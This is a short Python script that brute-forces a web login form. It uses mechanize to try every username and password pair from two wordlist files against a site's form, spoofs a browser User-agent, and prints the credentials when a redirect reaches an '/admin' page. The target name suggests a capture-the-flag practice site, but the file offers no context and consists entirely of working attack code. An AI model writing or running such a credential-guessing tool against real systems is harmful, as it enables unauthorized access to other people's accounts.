import urllib.request
import mechanize

b=mechanize.Browser()

b.addheaders = [('User-agent','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/45.0.2454101')]

f1=[]
f2=[]

with open('username_list.txt','r') as a:
    for line in a:
       f1.append(line.rstrip())

with open('password_list.txt','r') as c:
    for line in c:
       f2.append(line.rstrip())


for username in f1:
    for password in f2:
        response=b.open("tryhackus-theboyes.ml")
        b.select_form(nr=0)
        a=username
        b.form['email']=a+'@admin.com'
        b.form['password']=password
        b.method="POST"
        response=b.submit()
        print(a)
        print(password)
        if response.geturl()=="http://305d07726f0b.ngrok.io/admin":
            print ("Username found: "+ username.strip()+"@admin.com")
            print("Password found: "+password.strip())
            break